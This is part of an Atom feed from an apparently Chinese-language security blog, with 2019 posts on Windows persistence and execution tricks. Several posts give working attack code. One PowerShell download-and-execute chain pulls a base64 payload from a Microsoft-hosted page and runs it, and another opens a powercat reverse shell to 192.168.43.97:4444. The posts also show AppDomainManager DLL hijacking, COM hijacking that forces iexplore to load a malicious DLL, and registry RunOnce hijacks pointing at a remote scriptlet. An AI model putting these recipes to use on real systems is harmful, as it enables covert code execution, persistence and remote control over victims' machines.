+    <published>2019-08-04T08:21:30.000Z</published>
+    <updated>2019-08-04T08:27:43.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190804_162524.jpg" alt="enter description here"></p><a id="more"></a><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564907233275.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564907037712.jpg" alt="enter description here"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKCR<span class="tag">\<span class="name">Directory</span></span><span class="tag">\<span class="name">Background</span></span><span class="tag">\<span class="name">shell</span></span><span class="tag">\<span class="name">test</span></span></span><br><span class="line">@=”Launch Chrome”</span><br><span class="line">HKCR<span class="tag">\<span class="name">Directory</span></span><span class="tag">\<span class="name">Background</span></span><span class="tag">\<span class="name">shell</span></span><span class="tag">\<span class="name">test</span></span><span class="tag">\<span class="name">command</span></span></span><br><span class="line">@=”c:<span class="tag">\<span class="name">\</span></span>windows<span class="tag">\<span class="name">\</span></span>system32<span class="tag">\<span class="name">\</span></span>calc.exe”</span><br></pre></td></tr></table></figure><p><a href="http://www.hexacorn.com/blog/category/autostart-persistence/page/17/" target="_blank" rel="noopener">http://www.hexacorn.com/blog/category/autostart-persistence/page/17/</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190804_162524.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
+    
+    
+      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Run-key-hexacorn持久性 1</title>
+    <link href="www.ggsec.cn/Run-key-hexacorn.html"/>
+    <id>www.ggsec.cn/Run-key-hexacorn.html</id>
+    <published>2019-08-04T06:37:35.000Z</published>
+    <updated>2019-08-04T07:56:03.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190804_153524.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="1-构建"><a href="#1-构建" class="headerlink" title="1.构建"></a>1.构建</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564903275946.jpg" alt="enter description here"></p><h2 id="2-生成"><a href="#2-生成" class="headerlink" title="2. 生成"></a>2. 生成</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564903304779.jpg" alt="enter description here"></p><h2 id="3-修改"><a href="#3-修改" class="headerlink" title="3.修改"></a>3.修改</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564903394525.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564903960015.jpg" alt="enter description here"></p><h2 id="4-复制"><a href="#4-复制" class="headerlink" title="4.复制"></a>4.复制</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564904000551.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564903468916.jpg" alt="enter description here"></p><h2 id="5-执行"><a href="#5-执行" class="headerlink" title="5.执行"></a>5.执行</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564903484894.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564904036838.jpg" alt="enter description here"><br><a href="http://www.hexacorn.com/blog/2019/02/02/beyond-good-ol-run-key-part-101/" target="_blank" rel="noopener">http://www.hexacorn.com/blog/2019/02/02/beyond-good-ol-run-key-part-101/</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190804_153524.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
+    
+    
+      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Covenant</title>
+    <link href="www.ggsec.cn/Covenant.html"/>
+    <id>www.ggsec.cn/Covenant.html</id>
+    <published>2019-08-03T02:31:40.000Z</published>
+    <updated>2019-08-03T02:37:48.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/BA2C222C2F9284F4748ADD3E84C30F56.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/Covenant.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.   git clone --recurse-submodules https:<span class="comment">//github.com/cobbr/Covenant</span></span><br><span class="line"><span class="number">2</span>.   cd Covenant/Covenant</span><br><span class="line"><span class="number">3</span>.  dotnet build</span><br><span class="line"><span class="number">4</span>.  dotnet run</span><br></pre></td></tr></table></figure><p>目前测试只有ps 比较有用点  其他payload 有些bug</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/6615F2829518509843D89B3E66AEA564.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/4A408314A86E0999EE6A7EE0034CFEB1.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/16C5A4277786C85D57E6857CF5E73DF8.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564799776799.jpg" alt="enter description here"></p><p>参考资料：<br><a href="https://github.com/cobbr/Covenant/wiki/Installation-And-Startup" target="_blank" rel="noopener">https://github.com/cobbr/Covenant/wiki/Installation-And-Startup</a><br><a href="https://posts.specterops.io/covenant-the-usability-update-9a7a596a4772" target="_blank" rel="noopener">https://posts.specterops.io/covenant-the-usability-update-9a7a596a4772</a><br><a href="https://github.com/cobbr/Covenant" target="_blank" rel="noopener">https://github.com/cobbr/Covenant</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/BA2C222C2F9284F4748ADD3E84C30F56.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
+    
+    
+      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Tasks</title>
+    <link href="www.ggsec.cn/Tasks.html"/>
+    <id>www.ggsec.cn/Tasks.html</id>
+    <published>2019-07-31T13:59:58.000Z</published>
+    <updated>2019-08-03T05:48:53.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/CD450A6C1396CD080BC2012A9183FBCD.jpg" alt="enter description here"><br><a id="more"></a><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">using System;</span><br><span class="line">using System.EnterpriseServices;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public sealed class MyAppDomainManager : AppDomainManager</span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)</span><br><span class="line">    &#123;</span><br><span class="line">System.Windows.Forms.MessageBox.Show("AppDomain - KaBoom!");</span><br><span class="line"><span class="comment">// You have more control here than I am demonstrating. For example, you can set ApplicationBase, </span></span><br><span class="line"><span class="comment">// Or you can Override the Assembly Resolver, etc...</span></span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:tasks.dll tasks.cs</span></span><br><span class="line"><span class="comment">set APPDOMAIN_MANAGER_ASM=tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null</span></span><br><span class="line"><span class="comment">set APPDOMAIN_MANAGER_TYPE=MyAppDomainManager</span></span><br><span class="line"><span class="comment">set COMPLUS_Version=v4.0.30319</span></span><br><span class="line"><span class="comment">copy tasks.dll C:\Windows\System32\Tasks\tasks.dll</span></span><br><span class="line"><span class="comment">copy tasks.dll C:\Windows\SysWow64\Tasks\tasks.dll</span></span><br><span class="line"><span class="comment">FileHistory /?</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564582294357.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564582543206.jpg" alt="enter description here"></p><p><a href="https://gist.github.com/caseysmithrc/4bb34d28fa9d4071596cf2417fee5e37" target="_blank" rel="noopener">https://gist.github.com/caseysmithrc/4bb34d28fa9d4071596cf2417fee5e37</a></p><p>C#内存加载执行mimikatz 之dll劫持<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/151564810161_.pic_hd.jpg" alt="enter description here"></p><p> <a href="https://twitter.com/subTee/status/1157521629695508480" target="_blank" rel="noopener">https://twitter.com/subTee/status/1157521629695508480</a><br><a href="https://gist.github.com/caseysmithrc/3a4db14d571e902dc8c2e00fdbb9907f" target="_blank" rel="noopener">https://gist.github.com/caseysmithrc/3a4db14d571e902dc8c2e00fdbb9907f</a><br><a href="https://gist.github.com/demonsec666/644c6905cabe405364efe2ceea29e30c" target="_blank" rel="noopener">https://gist.github.com/demonsec666/644c6905cabe405364efe2ceea29e30c</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/CD450A6C1396CD080BC2012A9183FBCD.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
+    
+    
+      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>microsoft.com |  Backdoor</title>
+    <link href="www.ggsec.cn/microsoft-backdoor.html"/>
+    <id>www.ggsec.cn/microsoft-backdoor.html</id>
+    <published>2019-07-12T11:52:52.000Z</published>
+    <updated>2019-07-12T12:00:54.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/43A9BE1A3DFB57062DC24452F9932638.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/microsoft.com|Backdoor.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">poc:</span><br><span class="line"></span><br><span class="line">powershell -ep bypass /w <span class="number">1</span> /C New-Item -ItemType file <span class="string">'C:\Users\\\$env:USERNAME\Documents\pwn_sauce'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf '%s' "powershell -ep bypass /w 1 /C New-Item -ItemType file 'C:\Users\\\$env:USERNAME\Documents\pwn_sauce'" | base64 | tr -d '\n'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$wro</span> = iwr -Uri https:<span class="comment">//social.msdn.microsoft.com/Profile/xxxxxxxx -UseBasicParsing;$r = [Regex]::new("(?&lt;=START)(.*)(?=END)");$m = $r.Match($wro.rawcontent);if($m.Success)&#123; $p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m.value));iex $p &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PAYLOAD:</span><br><span class="line"></span><br><span class="line">IEX (New-Object System<span class="selector-class">.Net</span><span class="selector-class">.Webclient</span>).DownloadString(<span class="string">'https://pastebin.com/raw/xxxxxx’);powercat -c 192.168.43.97 -p 4444 -e cmd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EXP:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">printf '%s' "IEX (New-Object System.Net.Webclient).DownloadString('https://pastebin.com/raw/xxxxx’);powercat -c 192.168.43.97 -p 4444 -e cmd" | base64 | tr -d '\n'</span><br><span class="line"></span><br><span class="line">STARTXXXXXEND</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Threading.Tasks;</span><br><span class="line">using System.Collections;</span><br><span class="line">using System.Management.Automation;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApp2</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">    </span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        </span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">         </span><br><span class="line">            PowerShell ps = PowerShell.Create();</span><br><span class="line">            ps.AddScript("$wro = iwr -Uri https://social.msdn.microsoft.com/Profile/xxxxx6 -UseBasicParsing;$r = [Regex]::new(\"(?&lt;=START)(.*)(?=END)\");$m = $r.Match($wro.rawcontent);if($m.Success)&#123; $p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m.value));iex $p &#125;");</span><br><span class="line">            ps.Invoke();</span><br><span class="line">           </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/000410855D5706B078C3B68ABA7B3449.jpg" alt="enter description here"><br><a href="https://pastebin.com" target="_blank" rel="noopener">https://pastebin.com</a><br><a href="https://null-byte.wonderhowto.com/how-to/use-microsoft-com-domains-bypass-firewalls-execute-payloads-0196505/" target="_blank" rel="noopener">https://null-byte.wonderhowto.com/how-to/use-microsoft-com-domains-bypass-firewalls-execute-payloads-0196505/</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/43A9BE1A3DFB57062DC24452F9932638.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
+    
+    
+      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>comijack2</title>
+    <link href="www.ggsec.cn/comhijack2.html"/>
+    <id>www.ggsec.cn/comhijack2.html</id>
+    <published>2019-06-18T15:03:19.000Z</published>
+    <updated>2019-06-18T15:16:15.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/98C6DE4E4A0C386E511C104DBCE04BE4.jpg" alt="enter description here"></p><a id="more"></a><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/comhijack2.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7D3E0FDABCDF1B9D1A89AA360C247DBA.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7CECB8C599BF805C768A24A6009B667E.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F99D2F41478BEACFB8941A94D0CA7AA4.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F18F428B084AAF71FBF30D64C7D1AAB5.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"C:\Program Files\Internet Explorer\iexplore.exe"</span> shell:::&#123;<span class="number">55555555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">555555555555</span>&#125;</span><br><span class="line">C:\Windows\explorer<span class="selector-class">.exe</span> shell:::&#123;<span class="number">55555555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">555555555555</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell:::&#123;<span class="number">55555555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">555555555555</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$CLSID</span> = <span class="string">"55555555-5555-5555-5555-555555555555"</span></span><br><span class="line">Remove-Item -Recurse -Force -Path <span class="string">"HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;"</span> -ErrorAction SilentlyContinue</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">"C:\Users\demon\Desktop\mbox.dll"</span></span><br><span class="line">New-Item -Path "HKCU:\Software\Classes\CLSID" -ErrorAction SilentlyContinue | Out-Null</span><br><span class="line">New-Item -Path "HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;" | Out-Null</span><br><span class="line">New-Item -Path "HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\InProcServer32" | Out-Null</span><br><span class="line">New-Item -Path "HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\ShellFolder" | Out-Null</span><br><span class="line">New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\InProcServer32" -Name "(default)" -Value $Payload | Out-Null</span><br><span class="line">New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\InProcServer32" -Name "ThreadingModel" -Value "Apartment" | Out-Null</span><br><span class="line">New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\InProcServer32" -Name "LoadWithoutCOM" -Value "" | Out-Null</span><br><span class="line">New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\ShellFolder" -Name "HideOnDesktop" -Value "" | Out-Null</span><br><span class="line">New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\ShellFolder" -Name "Attributes" -Value 0xf090013d -PropertyType DWORD | Out-Null</span><br><span class="line"># force iexplore to load the malicious DLL and execute it</span><br><span class="line"><span class="variable">$shellWinGuid</span> = [System.Guid]::Parse(<span class="string">"&#123;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#125;"</span>)</span><br><span class="line"><span class="variable">$typeShwin</span> = [System.Type]::GetTypeFromCLSID(<span class="variable">$shellWinGuid</span>)</span><br><span class="line">$shwin = [System.Activator]::CreateInstance($typeShwin) | ? &#123;$_.fullname -match 'iexplore'&#125; | Select-Object -First 1</span><br><span class="line"><span class="variable">$shWin</span>.Navigate2(<span class="string">"shell:::&#123;$CLSID&#125;"</span>, <span class="number">2048</span>)</span><br></pre></td></tr></table></figure><p><a href="https://ired.team/offensive-security/code-execution/forcing-iexplore.exe-to-load-a-malicious-dll-via-com-abuse" target="_blank" rel="noopener">https://ired.team/offensive-security/code-execution/forcing-iexplore.exe-to-load-a-malicious-dll-via-com-abuse</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/98C6DE4E4A0C386E511C104DBCE04BE4.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
+    
+    
+      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>runonce-com-hijacking</title>
+    <link href="www.ggsec.cn/runonce-com-hijacking.html"/>
+    <id>www.ggsec.cn/runonce-com-hijacking.html</id>
+    <published>2019-06-10T01:53:12.000Z</published>
+    <updated>2019-06-10T13:56:50.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20181017_121520.jpg" alt="enter description here"><br><a id="more"></a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F8C65C239CD6D13EBF6E936E8ECF7297.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/6B932C450A5633C53CCB205BF5C5E66D.jpg" alt="enter description here"></p><p><a href="https://twitter.com/harr0ey/status/1052405330402074624" target="_blank" rel="noopener">https://twitter.com/harr0ey/status/1052405330402074624</a><br><a href="https://gist.github.com/homjxi0e/66555fedc78af49635b2e5dfea9dd1ae" target="_blank" rel="noopener">https://gist.github.com/homjxi0e/66555fedc78af49635b2e5dfea9dd1ae</a><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5.00</span></span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce]</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\setup]</span><br><span class="line">@=<span class="string">"rundll32 xwizards.dll,RunPropertySheet /u &#123;00000001-0000-0000-0000-0000FEEDACDC&#125;"</span></span><br><span class="line"><span class="string">"COM Hijacking"</span>=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">Windows Registry Editor Version <span class="number">5.00</span></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\Scripting.Dictionary]</span><br><span class="line">@=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\Scripting.Dictionary\CLSID]</span><br><span class="line">@=<span class="string">"&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;]</span><br><span class="line">@=<span class="string">"Scripting.Dictionary"</span></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;\InprocServer32]</span><br><span class="line">@=<span class="string">"C:\\WINDOWS\\system32\\scrobj.dll"</span></span><br><span class="line"><span class="string">"ThreadingModel"</span>=<span class="string">"Apartment"</span></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;\ProgID]</span><br><span class="line">@=<span class="string">"Scripting.Dictionary"</span></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;\ScriptletURL]</span><br><span class="line">@=<span class="string">"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSScripts/Payload/Slmgr_calc.sct"</span></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;\VersionIndependentProgID]</span><br><span class="line">@=<span class="string">"Scripting.Dictionary"</span></span><br></pre></td></tr></table></figure></p><h2 id="2-prmcnfg-vbs"><a href="#2-prmcnfg-vbs" class="headerlink" title="2 prmcnfg.vbs"></a>2 prmcnfg.vbs</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cscript C:\Windows\System32\Printing_Admin_Scripts\zh-CN\prncnfg.vbs /?</span><br><span class="line">cscript C:\Windows\System32\Printing_Admin_Scripts\en-US\prncnfg.vbs /?</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/D8lfnlKUIAYsPBB.jpg" alt="enter description here"></p><p><a href="https://twitter.com/harr0ey/status/1137443710197817344" target="_blank" rel="noopener">https://twitter.com/harr0ey/status/1137443710197817344</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20181017_121520.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
+    
+    
+      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Salsa-tools</title>
